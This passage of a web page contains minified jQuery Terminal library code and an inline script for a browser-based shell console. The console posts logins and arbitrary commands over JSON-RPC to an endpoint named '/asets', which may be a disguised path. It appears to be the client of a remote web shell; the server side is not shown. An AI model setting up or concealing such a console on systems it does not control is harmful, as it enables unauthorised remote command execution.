u(n,t){if(n.length){var i=n[0];var a=n.slice(1);var c=e.type(i);if(c==="string"){s++;se.pause();if(Te.ignoreSystemDescribe){if(s===1){l=f(i,r)}else{se.error(Fe.oneRPCWithIgnore)}u(a,t)}else{h(i,r,function(n){if(n){e.extend(o,n)}se.resume();u(a,t)})}}else if(c==="function"){if(l){se.error(Fe.oneInterpreterFunction)}else{l=i}u(a,t)}else if(c==="object"){e.extend(o,i);u(a,t)}}else{t()}})(n,function(){t({interpreter:c(o,false,r,l),completion:Object.keys(o)})})}else if(i==="string"){if(Te.ignoreSystemDescribe){o={interpreter:f(n,r)};if(e.isArray(Te.completion)){o.completion=Te.completion}t(o)}else{se.pause();h(n,r,function(e){if(e){a.interpreter=c(e,false,r);a.completion=Object.keys(e)}else{a.interpreter=f(n,r)}t(a);se.resume()})}}else if(i==="object"){t({interpreter:c(n,Te.checkArity),completion:Object.keys(n)})}else{if(i==="undefined"){n=e.noop}else if(i!=="function"){throw i+" is invalid interpreter value"}t({interpreter:n,completion:Te.completion})}}function m(n,r){var t=e.type(r)==="boolean"?"login":r;return function(r,i,o,a){se.pause();e.jrpc(n,t,[r,i],function(e){if(!e.error&&e.result){o(e.result)}else{o(null)}se.resume()},u)}}function d(e){if(typeof e==="string"){return e}else if(typeof e.fileName==="string"){return e.fileName+": "+e.message}else{return e.message}}function v(n,r){if(e.isFunction(Te.exceptionHandler)){Te.exceptionHandler.call(se,n)}else{se.exception(n,r)}}function y(){var e;if(le.prop){e=le.prop("scrollHeight")}else{e=le.attr("scrollHeight")}le.scrollTop(e)}function _(n,r){try{if(e.isFunction(r)){r(function(){})}else if(typeof r!=="string"){var t=n+" must be string or function";throw t}}catch(i){v(i,n.toUpperCase());return false}return true}var w=[];var b=1;function k(n,r){if(Te.convertLinks){n=n.replace(I,"[[!;;]$1]").replace($,"[[!;;]$1]")}var t=e.terminal.defaults.formatters;var i,o;if(!r.raw){for(i=0;i<t.length;++i){try{if(typeof t[i]=="function"){var a=t[i](n);if(typeof a=="string"){n=a}}}catch(s){alert("formatting error at formatters["+i+"]\n"+(s.stack?s.stack:s))}}n=e.terminal.encode(n)}w.push(b);if(!r.raw&&(n.length>ge||n.match(/\n/))){var l=r.keepWords;var f=e.terminal.split_equal(n,ge,l);for(i=0,o=f.length;i<o;++i){if(f[i]===""||f[i]==="\r"){w.push("<span></span>")}else{if(r.raw){w.push(f[i])}else{w.push(e.terminal.format(f[i],{linksNoReferrer:Te.linksNoReferrer}))}}}}else{if(!r.raw){n=e.terminal.format(n,{linksNoReferrer:Te.linksNoReferrer})}w.push(n)}w.push(r.finalize)}function S(n,r){try{var t=e.extend({exec:true,raw:false,finalize:e.noop},r||{});var i=e.type(n)==="function"?n():n;i=e.type(i)==="string"?i:String(i);if(i!==""){if(t.exec){i=e.map(i.split(P),function(n){if(n.match(P)&&!e.terminal.is_formatting(n)){n=n.replace(/^\[\[|\]\]$/g,"");if(fe&&fe.command==n){se.error(Fe.recursiveCall)}else{e.terminal.extended_command(se,n)}return""}else{return n}}).join("");if(i!==""){k(i,t)}}else{k(i,t)}}}catch(o){w=[];alert("[Internal Exception(process_line)]:"+d(o)+"\n"+o.stack)}}function T(){De.resize(ge);var n=pe.empty().detach();var r;if(Te.outputLimit>=0){var t=Te.outputLimit===0?se.rows():Te.outputLimit;r=he.slice(he.length-t-1)}else{r=he}try{w=[];e.each(r,function(e,n){S.apply(null,n)});De.before(n);se.flush()}catch(i){alert("Exception in redraw\n"+i.stack)}}function F(){if(Te.greetings===n){se.echo(se.signature)}else if(Te.greetings){var e=typeof Te.greetings;if(e==="string"){se.echo(Te.greetings)}else if(e==="function"){Te.greetings.call(se,se.echo)}else{se.error(Fe.wrongGreetings)}}}function E(n){var r=De.prompt();var t=De.mask();switch(typeof t){case"string":n=n.replace(/./g,t);break;case"boolean":if(t){n=n.replace(/./g,Te.maskChar)}else{n=e.terminal.escape_formatting(n)}break}var i={finalize:function(e){e.addClass("command")}};if(e.isFunction(r)){r(function(e){se.echo(e+n,i)})}else{se.echo(r+n,i)}}function A(e){var n=Z.get()[e[0]];if(!n){throw new Error(Fe.invalidTerminalId)}var r=e[1];if(V[r]){n.import_view(V[r])}else{ne=false;var t=e[2];if(t){n.exec(t).then(function(){ne=true;V[r]=n.export_view()})}}}function j(){if(ne){re=false;location.hash="#"+e.json_stringify(ee);setTimeout(function(){re=true},100)}}var z=true;var O;var K=[];var N=false;function L(r,t,i){O=r;if(z){z=false;if(Te.historyState||Te.execHash&&i){if(!V.length){se.save_state()}else{se.save_state(null)}}}function o(){if(!i){ne=true;if(Te.historyState){se.save_state(r,false)}ne=f}l.resolve();if(e.isFunction(Te.onAfterCommand)){Te.onAfterCommand(se,r)}}try{if(e.isFunction(Te.onBeforeCommand)){if(Te.onBeforeCommand(se,r)===false){return}}if(!i){fe=e.terminal.split_command(r)}if(!oe()){if(i&&(e.isFunction(Te.historyFilter)&&Te.historyFilter(r)||r.match(Te.historyFilter))){De.history().append(r)}}var s=Le.top();if(!t&&Te.echoCommand){E(r)}var l=new e.Deferred;var f=ne;if(r.match(/^\s*login\s*$/)&&se.token(true)){if(se.level()>1){se.logout(true)}else{se.logout()}o()}else if(Te.exit&&r.match(/^\s*exit\s*$/)&&!be){var c=se.level();if(c==1&&se.get_token()||c>1){if(se.get_token(true)){se.set_token(n,true)}se.pop()}o()}else if(Te.clear&&r.match(/^\s*clear\s*$/)&&!be){se.clear();o()}else{var u=he.length-1;var h=s.interpreter.call(se,r,se);if(h!==n){se.pause(true);return e.when(h).then(function(e){if(e&&u===he.length-1){a(e)}o();se.resume()})}else if(je){var p=r;K.push(function(){o()})}else{o()}}return l.promise()}catch(m){v(m,"USER");se.resume();throw m}}function D(){if(e.isFunction(Te.onBeforeLogout)){try{if(Te.onBeforeLogout(se)===false){return}}catch(n){v(n,"onBeforeLogout")}}J();if(e.isFunction(Te.onAfterLogout)){try{Te.onAfterLogout(se)}catch(n){v(n,"onAfterlogout")}}se.login(Te.login,true,G)}function J(){var n=se.prefix_name(true)+"_";e.Storage.remove(n+"token");e.Storage.remove(n+"login")}function M(n){var r=se.prefix_name()+"_interpreters";var t=e.Storage.get(r);if(t){t=e.parseJSON(t)}else{t=[]}if(e.inArray(n,t)==-1){t.push(n);e.Storage.set(r,e.json_stringify(t))}}function U(n){var r=Le.top();var t=se.prefix_name(true);if(!oe()){M(t)}De.name(t);if(e.isFunction(r.prompt)){De.prompt(function(e){r.prompt(e,se)})}else{De.prompt(r.prompt)}De.set("");if(!n&&e.isFunction(r.onStart)){r.onStart(se)}}var Y;function G(){U();F();var n=false;if(e.isFunction(Te.onInit)){ke=function(){n=true};try{Te.onInit(se)}catch(r){v(r,"OnInit")}finally{ke=e.noop;if(!n){se.resume()}}}function t(){if(re&&Te.execHash){try{if(location.hash){var n=location.hash.replace(/^#/,"");ee=e.parseJSON(decodeURIComponent(n))}else{ee=[]}if(ee.length){A(ee[ee.length-1])}else if(V[0]){se.import_view(V[0])}}catch(r){v(r,"TERMINAL")}}}if(te){te=false;if(e.fn.hashchange){e(window).hashchange(t)}else{e(window).bind("hashchange",t)}}}function ie(n,r,t){if(Te.clear&&e.inArray("clear",t)==-1){t.push("clear")}if(Te.exit&&e.inArray("exit",t)==-1){t.push("exit")}var i=De.get().substring(0,De.position());if(i!==n){return}var o=new RegExp("^"+e.terminal.escape_regex(r));var a=[];for(var s=t.length;s--;){if(o.test(t[s])){a.push(t[s])}}if(a.length===1){se.insert(a[0].replace(o,""))}else if(a.length>1){if(ue>=2){E(n);var l=a.reverse().join("	");se.echo(e.terminal.escape_brackets(l),{keepWords:true});ue=0}else{var f=false;var c;var u;e:for(u=r.length;u<a[0].length;++u){for(s=1;s<a.length;++s){if(a[0].charAt(u)!==a[s].charAt(u)){break e}}f=true}if(f){se.insert(a[0].slice(0,u).replace(o,""))}}}}function oe(){return be||De.mask()!==false}function ae(r){var t,i,o=Le.top(),a;if(!se.paused()&&se.enabled()){if(e.isFunction(o.keydown)){t=o.keydown(r,se);if(t!==n){return t}}else if(e.isFunction(Te.keydown)){t=Te.keydown(r,se);if(t!==n){return t}}if(Te.completion&&e.type(Te.completion)!="boolean"&&o.completion===n){a=Te.completion}else{a=o.completion}if(a=="settings"){a=Te.completion}se.oneTime(10,function(){$e()});if(r.which!==9){ue=0}if(r.which===68&&r.ctrlKey){if(!be){if(De.get()===""){if(Le.size()>1||Te.login!==n){se.pop("")}else{se.resume();se.echo("")}}else{se.set_command("")}}return false}else if(r.which===76&&r.ctrlKey){se.clear()}else if(a&&r.which===9){++ue;var s=De.position();var l=De.get().substring(0,s);var f=l.split(" ");var c;if(Fe.length==1){c=f[0]}else{c=f[f.length-1];for(i=f.length-1;i>0;i--){if(f[i-1][f[i-1].length-1]=="\\"){c=f[i-1]+" "+c}else{break}}}switch(e.type(a)){case"function":a(se,c,function(e){ie(l,c,e)});break;case"array":ie(l,c,a);break;default:throw new Error(Fe.invalidCompletion)}return false}else if((r.which===118||r.which===86)&&(r.ctrlKey||r.metaKey)){se.oneTime(1,function(){y()});return}else if(r.which===9&&r.ctrlKey){if(Z.length()>1){se.focus(false);return false}}else if(r.which===34){se.scroll(se.height())}else if(r.which===33){se.scroll(-se.height())}else{se.attr({scrollTop:se.attr("scrollHeight")})}}else if(r.which===68&&r.ctrlKey){if(X.length){for(i=X.length;i--;){var u=X[i];if(4!==u.readyState){try{u.abort()}catch(h){se.error(Fe.ajaxAbortError)}}}X=[];se.resume()}return false}}var se=this;if(this.length>1){return this.each(function(){e.fn.terminal.call(e(this),r,e.extend({name:se.selector},i))})}if(se.data("terminal")){return se.data("terminal")}if(se.length===0){throw sprintf(e.terminal.defaults.strings.invalidSelector,se.selector)}var le;var fe;var ce=false;var ue=0;var he=[];var pe;var me=Z.length();var ge;var de;var ve=[];var ye;var _e=new g;var we=e.Deferred();var be=false;var ke=e.noop;var xe,Ce;var Se=[];var Te=e.extend({},e.terminal.defaults,{name:se.selector},i||{});var Fe=e.terminal.defaults.strings;var Ee=Te.enabled,Ae=false;var je=false;var Re=true;e.extend(se,e.omap({id:function(){return me},clear:function(){pe.html("");he=[];try{Te.onClear(se)}catch(e){v(e,"onClear")}se.attr({scrollTop:0});return se},export_view:function(){var n={};if(e.isFunction(Te.onExport)){try{n=Te.onExport()}catch(r){v(r,"onExport")}}return e.extend({},{focus:Ee,mask:De.mask(),prompt:se.get_prompt(),command:se.get_command(),position:De.position(),lines:t(he),interpreters:Le.clone()},n)},import_view:function(n){if(be){throw new Error(sprintf(Fe.notWhileLogin,"import_view"))}if(e.isFunction(Te.onImport)){try{Te.onImport(n)}catch(r){v(r,"onImport")}}we.then(function(){se.set_prompt(n.prompt);se.set_command(n.command);De.position(n.position);De.mask(n.mask);if(n.focus){se.focus()}he=t(n.lines);Le=n.interpreters;T()});return se},save_state:function(r,t,i){if(typeof i!="undefined"){V[i]=se.export_view()}else{V.push(se.export_view())}if(!e.isArray(ee)){ee=[]}if(r!==n&&!t){var o=[me,V.length-1,r];ee.push(o);j()}},exec:function(n,r,t){var i=t||new e.Deferred;function o(){if(e.isArray(n)){(function t(){var e=n.shift();if(e){se.exec(e,r).then(t)}else{i.resolve()}})()}else if(je){Se.push([n,r,i])}else{L(n,r,true).then(function(){i.resolve(se)})}}if(we.state()!="resolved"){we.then(o)}else{o()}return i.promise()},autologin:function(e,n,r){se.trigger("terminal.autologin",[e,n,r]);return se},login:function(n,r,t,i){_e.push([].slice.call(arguments));if(be){throw new Error(sprintf(Fe.notWhileLogin,"login"))}if(!e.isFunction(n)){throw new Error(Fe.loginIsNotAFunction)}be=true;if(se.token()&&se.level()==1&&!Re){be=false;se.logout(true)}else{if(se.token(true)&&se.login_name(true)){be=false;if(e.isFunction(t)){t()}return se}}var o=null;if(Te.history){De.history().disable()}var a=se.level();function s(n,o,s,l){if(o){while(se.level()>a){se.pop()}if(Te.history){De.history().enable()}var f=se.prefix_name(true)+"_";e.Storage.set(f+"token",o);e.Storage.set(f+"login",n);be=false;if(e.isFunction(t)){t()}}else{if(r){if(!s){se.error(Fe.wrongPasswordTryAgain)}se.pop().set_mask(false)}else{be=false;if(!s){se.error(Fe.wrongPassword)}se.pop().pop()}if(e.isFunction(i)){i()}}se.off("terminal.autologin")}se.on("terminal.autologin",function(e,n,r,t){s(n,r,t)});se.push(function(e){se.set_mask(Te.maskChar).push(function(r){try{n.call(se,e,r,function(n,r){s(e,n,r)})}catch(t){v(t,"AUTH")}},{prompt:Fe.password+": ",name:"password"})},{prompt:Fe.login+": ",name:"login"});return se},settings:function(){return Te},commands:function(){return Le.top().interpreter},setInterpreter:function(){if(window.console&&console.warn){console.warn("This function is deprecated, use set_inte"+"rpreter insead!")}return se.set_interpreter.apply(se,arguments)},set_interpreter:function(n,r){function t(){se.pause();p(n,!!r,function(n){se.resume();var r=Le.top();e.extend(r,n);U(true)})}if(e.type(n)=="string"&&r){se.login(m(n,r),true,t)}else{t()}return se},greetings:function(){F();return se},paused:function(){return je},pause:function(n){ke();if(!je&&De){we.then(function(){je=true;De.disable();if(!n){De.hidden()}if(e.isFunction(Te.onPause)){Te.onPause()}})}return se},resume:function(){function n(){je=false;if(Z.front()==se){De.enable()}De.visible();var n=Se;Se=[];for(var r=0;r<n.length;++r){se.exec.apply(se,n[r])}se.trigger("resume");var t=K.shift();if(t){t()}y();if(e.isFunction(Te.onResume)){Te.onResume()}}if(je&&De){if(we.state()!="resolved"){we.then(n)}else{n()}}return se},cols:function(){return Te.numChars?Te.numChars:B(se)},rows:function(){return Te.numRows?Te.numRows:H(se)},history:function(){return De.history()},history_state:function(e){if(e){se.oneTime(1,function(){Te.historyState=true;if(!V.length){se.save_state()}else if(Z.length()>1){se.save_state(null)}})}else{Te.historyState=false}return se},clear_history_state:function(){ee=[];V=[];return se},next:function(){if(Z.length()===1){return se}else{var n=se.offset().top;var r=se.height();var t=se.scrollTop();Z.front().disable();var i=Z.rotate().enable();var o=i.offset().top-50;e("html,body").animate({scrollTop:o},500);try{Te.onTerminalChange(i)}catch(a){v(a,"onTerminalChange")}return i}},focus:function(e,n){we.then(function(){if(Z.length()===1){if(e===false){try{if(!n&&Te.onBlur(se)!==false||n){se.disable()}}catch(r){v(r,"onBlur")}}else{try{if(!n&&Te.onFocus(se)!==false||n){se.enable()}}catch(r){v(r,"onFocus")}}}else{if(e===false){se.next()}else{var t=Z.front();if(t!=se){t.disable();if(!n){try{Te.onTerminalChange(se)}catch(r){v(r,"onTerminalChange")}}}Z.set(se);se.enable()}}});return se},freeze:function(e){we.then(function(){if(e){se.disable();Ae=true}else{Ae=false;se.enable()}})},frozen:function(){return Ae},enable:function(){if(!Ee&&!Ae){if(ge===n){se.resize()}we.then(function(){De.enable();Ee=true})}return se},disable:function(){if(Ee&&!Ae){we.then(function(){Ee=false;De.disable()})}return se},enabled:function(){return Ee},signature:function(){var e=se.cols();var n=e<15?null:e<35?0:e<55?1:e<64?2:e<75?3:4;if(n!==null){return Q[n].join("\n")+"\n"}else{return""}},version:function(){return e.terminal.version},cmd:function(){return De},get_command:function(){return De.get()},set_command:function(e){we.then(function(){De.set(e)});return se},insert:function(e){if(typeof e==="string"){we.then(function(){De.insert(e)});return se}else{throw"insert function argument is not a string"}},set_prompt:function(n){we.then(function(){if(_("prompt",n)){if(e.isFunction(n)){De.prompt(function(e){n(e,se)})}else{De.prompt(n)}Le.top().prompt=n}});return se},get_prompt:function(){return Le.top().prompt},set_mask:function(e){we.then(function(){De.mask(e===true?Te.maskChar:e)});return se},get_output:function(n){if(n){return he}else{return e.map(he,function(n){return e.isFunction(n[0])?n[0]():n[0]}).join("\n")}},resize:function(n,r){if(!se.is(":visible")){se.stopTime("resize");se.oneTime(500,"resize",function(){se.resize(n,r)})}else{if(n&&r){se.width(n);se.height(r)}n=se.width();r=se.height();var t=se.cols();var i=se.rows();if(t!==ge||i!==de){ge=t;de=i;T();var o=Le.top();if(e.isFunction(o.resize)){o.resize(se)}else if(e.isFunction(Te.onResize)){Te.onResize(se)}Ce=r;xe=n;y()}}return se},flush:function(){try{var n;e.each(w,function(r,t){if(t===b){n=e("<div></div>")}else if(e.isFunction(t)){n.appendTo(pe);try{t(n)}catch(i){v(i,"USER:echo(finalize)")}}else{e("<div/>").html(t).appendTo(n).width("100%")}});if(Te.outputLimit>=0){var r=Te.outputLimit===0?se.rows():Te.outputLimit;var t=pe.find("div div");if(t.length>r){var i=t.length-r+1;var o=t.slice(0,i);var a=o.parent();o.remove();a.each(function(){var n=e(this);if(n.is(":empty")){n.remove()}})}}de=H(se);$e();if(Te.scrollOnEcho){y()}w=[]}catch(s){alert("[Flush] "+d(s)+"\n"+s.stack)}return se},update:function(e,n){we.then(function(){if(e<0){e=he.length+e}if(!he[e]){se.error("Invalid line number "+e)}else{if(n===null){he.splice(e,1)}else{he[e][0]=n}T()}});return se},last_index:function(){return he.length-1},echo:function(n,r){n=n||"";e.when(n).then(function(n){try{var t=e.extend({flush:true,raw:Te.raw,finalize:e.noop,keepWords:false},r||{});if(t.flush){w=[]}S(n,t);he.push([n,e.extend(t,{exec:false})]);if(t.flush){se.flush()}}catch(i){alert("[Terminal.echo] "+d(i)+"\n"+i.stack)}});return se},error:function(n,r){var t=e.terminal.escape_brackets(n).replace(/\\$/,"&#92;").replace(R,"]$1[[;;;error]");return se.echo("[[;;;error]"+t+"]",r)},exception:function(n,r){var t=d(n);if(r){t="&#91;"+r+"&#93;: "+t}if(t){se.error(t,{finalize:function(e){e.addClass("exception message")}})}if(typeof n.fileName==="string"){se.pause();e.get(n.fileName,function(e){se.resume();var r=n.lineNumber-1;var t=e.split("\n")[r];if(t){se.error("["+n.lineNumber+"]: "+t)}})}if(n.stack){var i=e.terminal.escape_brackets(n.stack);se.echo(i.split(/\n/g).map(function(e){return"[[;;;error]"+e.replace(R,function(e){return"]"+e+"[[;;;error]"})+"]"}).join("\n"),{finalize:function(e){e.addClass("exception stack-trace")}})}},scroll:function(e){var n;e=Math.round(e);if(le.prop){if(e>le.prop("scrollTop")&&e>0){le.prop("scrollTop",0)}n=le.prop("scrollTop");le.scrollTop(n+e)}else{if(e>le.attr("scrollTop")&&e>0){le.attr("scrollTop",0)}n=le.attr("scrollTop");le.scrollTop(n+e)}return se},logout:function(e){if(be){throw new Error(sprintf(Fe.notWhileLogin,"logout"))}we.then(function(){if(e){var r=_e.pop();se.set_token(n,true);se.login.apply(se,r)}else{while(Le.size()>0){if(se.pop()){break}}}});return se},token:function(n){return e.Storage.get(se.prefix_name(n)+"_token")},set_token:function(n,r){var t=se.prefix_name(r)+"_token";if(typeof n=="undefined"){e.Storage.remove(t,n)}else{e.Storage.set(t,n)}return se},get_token:function(n){return e.Storage.get(se.prefix_name(n)+"_token")},login_name:function(n){return e.Storage.get(se.prefix_name(n)+"_login")},name:function(){return Le.top().name},prefix_name:function(e){var n=(Te.name?Te.name+"_":"")+me;if(e&&Le.size()>1){var r=Le.map(function(e){return e.name}).slice(1).join("_");if(r){n+="_"+r}}return n},read:function(n,r){var t=new e.Deferred;se.push(function(n){se.pop();if(e.isFunction(r)){r(n)}t.resolve(n)},{prompt:n});return t.promise()},push:function(r,t){we.then(function(){t=t||{};var i={infiniteLogin:false};var o=e.extend({},i,t);if(!o.name&&fe){o.name=fe.name}if(o.prompt===n){o.prompt=(o.name||">")+" "}var a=Le.top();if(a){a.mask=De.mask()}var s=je;p(r,!!t.login,function(n){Le.push(e.extend({},n,o));if(e.isArray(n.completion)&&o.completion===true){Le.top().completion=n.completion}else if(!n.completion&&o.completion===true){Le.top().completion=false}if(o.login){var t=e.type(o.login);if(t=="function"){se.login(o.login,o.infiniteLogin,U,o.infiniteLogin?e.noop:se.pop)}else if(e.type(r)=="string"&&t=="string"||t=="boolean"){se.login(m(r,o.login),o.infiniteLogin,U,o.infiniteLogin?e.noop:se.pop)}}else{U()}if(!s){se.resume()}})});return se},pop:function(r){if(r!==n){E(r)}var t=se.token(true);if(Le.size()==1){if(Te.login){D();if(e.isFunction(Te.onExit)){try{Te.onExit(se)}catch(i){v(i,"onExit")}}return true}else{se.error(Fe.canExitError)}}else{if(se.token(true)){J()}var o=Le.pop();U();if(be&&se.get_prompt()!=Fe.login+": "){be=false}if(e.isFunction(o.onExit)){try{o.onExit(se)}catch(i){v(i,"onExit")}}se.set_mask(Le.top().mask)}return se},option:function(n,r){if(typeof r=="undefined"){if(typeof n=="string"){return Te[n]}else if(typeof n=="object"){e.each(n,function(e,n){Te[e]=n})}}else{Te[n]=r}return se},level:function(){return Le.size()},reset:function(){we.then(function(){se.clear();while(Le.size()>1){Le.pop()}G()});return se},purge:function(){we.then(function(){var n=se.prefix_name()+"_";var r=e.Storage.get(n+"interpreters");e.each(e.parseJSON(r),function(n,r){e.Storage.remove(r+"_commands");e.Storage.remove(r+"_token");e.Storage.remove(r+"_login")});De.purge();e.Storage.remove(n+"interpreters")});return se},destroy:function(){we.then(function(){De.destroy().remove();pe.remove();e(document).unbind(".terminal");e(window).unbind(".terminal");se.unbind("click mousewheel mousedown mouseup");se.removeData("terminal").removeClass("terminal");if(Te.width){se.css("width","")}if(Te.height){se.css("height","")}e(window).off("blur",We).off("focus",He);Z.remove(me)});return se}},function(e,n){return function(){try{return n.apply(se,[].slice.apply(arguments))}catch(r){if(e!=="exec"&&e!=="resume"){v(r,"TERMINAL")}throw r}}}));var $e=function(){var e=q(se);return function(){if(e!==q(se)){se.resize();e=q(se)}}}();if(Te.width){se.width(Te.width)}if(Te.height){se.height(Te.height)}var Ie=navigator.userAgent.toLowerCase();if(!Ie.match(/(webkit)[ \/]([\w.]+)/)&&se[0].tagName.toLowerCase()=="body"){le=e("html")}else{le=se}e(document).bind("ajaxSend.terminal",function(e,n,r){X.push(n)});pe=e("<div>").addClass("terminal-output").appendTo(se);se.addClass("terminal");if(Te.login&&e.isFunction(Te.onBeforeLogin)){try{if(Te.onBeforeLogin(se)===false){Re=false}}catch(ze){v(ze,"onBeforeLogin");throw ze}}var Oe=Te.login;var Ke;if(typeof r=="string"){Ke=r}else if(r instanceof Array){for(var Ne=0,Pe=r.length;Ne<Pe;++Ne){if(typeof r[Ne]=="string"){Ke=r[Ne];break}}}if(Ke&&(typeof Te.login==="string"||Te.login===true)){Te.login=m(Ke,Te.login)}Z.append(se);var Le;var De;var Be;function He(){if(Be){se.focus()}}function We(){Be=Ee;se.disable()}p(r,!!Te.login,function(r){if(Te.completion&&typeof Te.completion!="boolean"||!Te.completion){r.completion="settings"}Le=new g(e.extend({name:Te.name,prompt:Te.prompt,keypress:Te.keypress,keydown:Te.keydown,resize:Te.onResize,greetings:Te.greetings,mousewheel:Te.mousewheel},r));De=e("<div/>").appendTo(se).cmd({prompt:Te.prompt,history:Te.history,historyFilter:Te.historyFilter,historySize:Te.historySize,width:"100%",enabled:Ee&&!x,keydown:ae,keypress:function(n){var r,t,i=Le.top();if(e.isFunction(i.keypress)){return i.keypress(n,se)}else if(e.isFunction(Te.keypress)){return Te.keypress(n,se)}},onCommandChange:function(n){if(e.isFunction(Te.onCommandChange)){try{Te.onCommandChange(n,se)}catch(r){v(r,"onCommandChange");throw r}}y()},commands:L});if(Ee&&se.is(":visible")&&!x){se.focus(n,true)}else{se.disable()}se.oneTime(100,function(){function n(n){var r=e(n.target);if(!r.closest(".terminal").length&&se.enabled()&&Te.onBlur(se)!==false){se.disable()}}e(document).bind("click.terminal",n).bind("contextmenu.terminal",n)});var t=e(window);if(!x){t.on("focus",He).on("blur",We)}else{}if(x){se.click(function(){if(!se.enabled()&&!Ae){se.focus();De.enable()}else{se.focus(false)}})}else{(function(){var n=0;var r=false;se.mousedown(function(){e(window).mousemove(function(){r=true;n=0;e(window).unbind("mousemove")})}).mouseup(function(){var t=r;r=false;e(window).unbind("mousemove");if(!t&&++n==1){n=0;if(!se.enabled()&&!Ae){se.focus();De.enable()}}})})()}se.delegate(".exception a","click",function(n){var r=e(this).attr("href");if(r.match(/:[0-9]+$/)){n.preventDefault();s(r)}});if(!navigator.platform.match(/linux/i)){se.mousedown(function(e){if(e.which==2){var n=W();se.insert(n)}})}if(se.is(":visible")){ge=se.cols();De.resize(ge);de=H(se)}if(Te.login){se.login(Te.login,true,G)}else{G()}se.oneTime(100,function(){t.bind("resize.terminal",function(){if(se.is(":visible")){var e=se.width();var n=se.height();if(Ce!==n||xe!==e){se.resize()}}})});function i(n){var r=Z.get()[n[0]];if(r&&me==r.id()){if(n[2]){try{if(je){var t=e.Deferred();K.push(function(){return r.exec(n[2]).then(function(e,i){r.save_state(n[2],true,n[1]);t.resolve()})});return t.promise()}else{return r.exec(n[2]).then(function(e,t){r.save_state(n[2],true,n[1])})}}catch(i){var o=e.terminal.escape_brackets(command);var a="Error while exec with command "+o;r.error(a).exception(i)}}}}if(Te.execHash){if(location.hash){setTimeout(function(){try{var n=location.hash.replace(/^#/,"");ee=e.parseJSON(decodeURIComponent(n));var r=0;(function o(){var e=ee[r++];if(e){i(e).then(o)}else{ne=true}})()}catch(t){}})}else{ne=true}}else{ne=true}if(e.event.special.mousewheel){var o=false;e(document).bind("keydown.terminal",function(e){if(e.shiftKey){o=true}}).bind("keyup.terminal",function(e){if(e.shiftKey||e.which==16){o=false}});se.mousewheel(function(n,r){if(!o){var t=Le.top();if(e.isFunction(t.mousewheel)){var i=t.mousewheel(n,r,se);if(i===false){return}}else if(e.isFunction(Te.mousewheel)){Te.mousewheel(n,r,se)}if(r>0){se.scroll(-40)}else{se.scroll(40)}}})}we.resolve()});se.data("terminal",se);return se}})(jQuery);</script>
        <script>(function($) {
                $(document).ready(function() {
                    var settings = {'url': '/asets',
                        'prompt_path_length': 32,
                        'domain': document.domain || window.location.host,
                        'is_small_window': $(document).width() < 625 ? true : false};
                    var environment = {'user': '', 'hostname': '', 'path': ''};
                    var no_login = typeof(__NO_LOGIN__) !== 'undefined' ? __NO_LOGIN__ : false;
                    var silent_mode = false;

                    // Default banner
                    var banner_main = "";
                    var banner_link = '';
                    var banner_extra = banner_link + '\n';

                    // Big banner
                    if (!settings.is_small_window) {
                    }

                    // Output
                    function show_output(output) {
                        if (output) {
                            if (typeof output === 'string') terminal.echo(output);
                            else if (output instanceof Array) terminal.echo($.map(output, function(object) {
                                return $.json_stringify(object);
                            }).join(' '));
                            else if (typeof output === 'object') terminal.echo($.json_stringify(output));
                            else terminal.echo(output);
                        }
                    }

                    // Prompt
                    function make_prompt() {
                        var path = environment.path;
                        if (path && path.length > settings.prompt_path_length)
                            path = '...' + path.slice(path.length - settings.prompt_path_length + 3);

                        return '[[b;#d33682;]' + (environment.user || 'user') + ']' +
                            '@[[b;#6c71c4;]' + (environment.hostname || settings.domain || 'web-console') + '] ' +
                            (path || '~') +
                            '$ ';
                    }

                    function update_prompt(terminal) {
                        terminal.set_prompt(make_prompt());
                    }

                    // Environment
                    function update_environment(terminal, data) {
                        if (data) {
                            $.extend(environment, data);
                            update_prompt(terminal);
                        }
                    }

                    // Service
                    function service(terminal, method, parameters, success, error, options) {
                        options = $.extend({'pause': true}, options);
                        if (options.pause) terminal.pause();

                        $.jrpc(settings.url, method, parameters,
                            function(json) {
                                if (options.pause) terminal.resume();

                                if (!json.error) {
                                    if (success) success(json.result);
                                }
                                else if (error) error();
                                else {
                                    var message = $.trim(json.error.message || '');
                                    var data =  $.trim(json.error.data || '');

                                    if (!message && data) {
                                        message = data;
                                        data = '';
                                    }

                                    terminal.error('&#91;ERROR&#93;' +
                                        ' RPC: ' + (message || 'Unknown error') +
                                        (data ? (" (" + data + ")") : ''));
                                }
                            },
                            function(xhr, status, error_data) {
                                if (options.pause) terminal.resume();

                                if (error) error();
                                else {
                                    if (status !== 'abort') {
                                        var response = $.trim(xhr.responseText || '');

                                        terminal.error('&#91;ERROR&#93;' +
                                            ' AJAX: ' + (status || 'Unknown error') +
                                            (response ? ("\nServer reponse:\n" + response) : ''));
                                    }
                                }
                            });
                    }

                    function service_authenticated(terminal, method, parameters, success, error, options) {
                        var token = terminal.token();
                        if (token) {
                            var service_parameters = [token, environment];
                            if (parameters && parameters.length)
                                service_parameters.push.apply(service_parameters, parameters);
                            service(terminal, method, service_parameters, success, error, options);
                        }
                        else {
                            // Should never happen
                            terminal.error('&#91;ERROR&#93; Access denied (no authentication token found)');
                        }
                    }

                    // Interpreter
                    function interpreter(command, terminal) {
                        command = $.trim(command || '');
                        if (!command) return;

                        var command_parsed = $.terminal.splitCommand(command),
                            method = null, parameters = [];

                        if (command_parsed.name.toLowerCase() === 'cd') {
                            method = 'cd';
                            parameters = [command_parsed.args.length ? command_parsed.args[0] : ''];
                        }
                        else {
                            method = 'run';
                            parameters = [command];
                        }

                        if (method) {
                            service_authenticated(terminal, method, parameters, function(result) {
                                update_environment(terminal, result.environment);
                                show_output(result.output);
                            });
                        }
                    }

                    // Login
                    function login(user, password, callback) {
                        user = $.trim(user || '');
                        password = $.trim(password || '');

                        if (user && password) {
                            service(terminal, 'login', [user, password], function(result) {
                                    if (result && result.token) {
                                        environment.user = user;
                                        update_environment(terminal, result.environment);
                                        show_output(result.output);
                                        callback(result.token);
                                    }
                                    else callback(null);
                                },
                                function() { callback(null); });
                        }
                        else callback(null);
                    }

                    // Completion
                    function completion(terminal, pattern, callback) {
                        var view = terminal.export_view();
                        var command = view.command.substring(0, view.position);

                        service_authenticated(terminal, 'completion', [pattern, command], function(result) {
                            show_output(result.output);

                            if (result.completion && result.completion.length) {
                                result.completion.reverse();
                                callback(result.completion);
                            }
                        }, null, {pause: false});
                    }

                    // Logout
                    function logout() {
                        silent_mode = true;

                        try {
                            terminal.clear();
                            terminal.logout();
                        }
                        catch (error) {}

                        silent_mode = false;
                    }

                    // Terminal
                    var terminal = $('body').terminal(interpreter, {
